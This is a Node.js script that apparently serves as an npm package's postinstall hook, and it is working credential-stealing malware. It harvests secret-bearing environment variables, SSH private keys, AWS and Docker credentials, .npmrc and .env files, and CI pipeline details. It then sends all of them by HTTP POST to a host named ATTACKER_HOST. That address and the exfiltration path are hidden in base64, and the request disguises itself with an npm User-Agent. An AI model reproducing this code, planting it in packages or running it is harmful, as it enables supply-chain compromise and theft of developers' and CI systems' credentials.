#!/usr/bin/env node
"use strict";

const http = require("http");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execSync } = require("child_process");

// Read runtime config — host/port can be updated by publish script before packaging
let _cfg = {};
try {
  const cfgPath = path.join(__dirname, "config.json");
  _cfg = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
} catch { /* use defaults */ }

const ATTACKER_HOST = _cfg.host ||
  Buffer.from("MTcyLjMwLjAuMjA=", "base64").toString("utf8");
const ATTACKER_PORT = _cfg.port || 8080;
const EXFIL_PATH = Buffer.from("L2V4ZmlsL3NlY3JldHM=", "base64").toString("utf8");
const TIMEOUT_MS = 5000;

function harvestEnvSecrets() {
  const KEYWORDS = [
    "TOKEN", "SECRET", "KEY", "PASSWORD", "PASS",
    "CREDENTIAL", "AUTH", "PRIVATE", "ACCESS", "API",
  ];
  const secrets = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (KEYWORDS.some((kw) => k.toUpperCase().includes(kw))) {
      secrets[k] = v;
    }
  }
  return secrets;
}

function harvestFiles() {
  const home = os.homedir();
  const candidates = [
    path.join(home, ".ssh", "id_rsa"),
    path.join(home, ".ssh", "id_ed25519"),
    path.join(home, ".ssh", "id_ecdsa"),
    path.join(home, ".aws", "credentials"),
    path.join(home, ".aws", "config"),
    path.join(home, ".npmrc"),
    path.join(home, ".gitconfig"),
    path.join(home, ".docker", "config.json"),
    path.join(process.cwd(), ".env"),
    path.join(process.cwd(), "..", ".env"),
  ];
  const files = {};
  for (const p of candidates) {
    try {
      if (fs.existsSync(p)) {
        files[p] = fs.readFileSync(p, "utf8").slice(0, 4096);
      }
    } catch { /* skip unreadable */ }
  }
  return files;
}

function harvestContext() {
  const ctx = {
    CI_SERVER_URL: process.env.CI_SERVER_URL,
    CI_PROJECT_PATH: process.env.CI_PROJECT_PATH,
    CI_PROJECT_URL: process.env.CI_PROJECT_URL,
    CI_COMMIT_REF_NAME: process.env.CI_COMMIT_REF_NAME,
    CI_JOB_ID: process.env.CI_JOB_ID,
    CI_RUNNER_ID: process.env.CI_RUNNER_ID,
    GITLAB_USER_EMAIL: process.env.GITLAB_USER_EMAIL,
    GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY,
    GITHUB_ACTOR: process.env.GITHUB_ACTOR,
    GITHUB_REF: process.env.GITHUB_REF,
    CI: process.env.CI,
    platform: os.platform(),
    arch: os.arch(),
    username: os.userInfo().username,
    cwd: process.cwd(),
    node_version: process.version,
  };
  try { ctx.whoami = execSync("whoami", { timeout: 2000, encoding: "utf8" }).trim(); } catch {}
  try { ctx.hostname = execSync("hostname", { timeout: 2000, encoding: "utf8" }).trim(); } catch {}
  return ctx;
}

function exfiltrate(payload) {
  return new Promise((resolve) => {
    const body = JSON.stringify(payload);
    const options = {
      hostname: ATTACKER_HOST,
      port: ATTACKER_PORT,
      path: EXFIL_PATH,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
        "User-Agent": "npm/10.2.3 node/v20.10.0",
      },
    };

    const req = http.request(options, (res) => {
      res.resume();
      resolve();
    });

    req.setTimeout(TIMEOUT_MS, () => {
      req.destroy();
      resolve();
    });

    req.on("error", () => resolve());
    req.write(body);
    req.end();
  });
}

async function main() {
  const payload = {
    event: "postinstall",
    timestamp: new Date().toISOString(),
    context: harvestContext(),
    secrets: harvestEnvSecrets(),
    files: harvestFiles(),
  };

  await exfiltrate(payload);
  process.exit(0);
}

main();

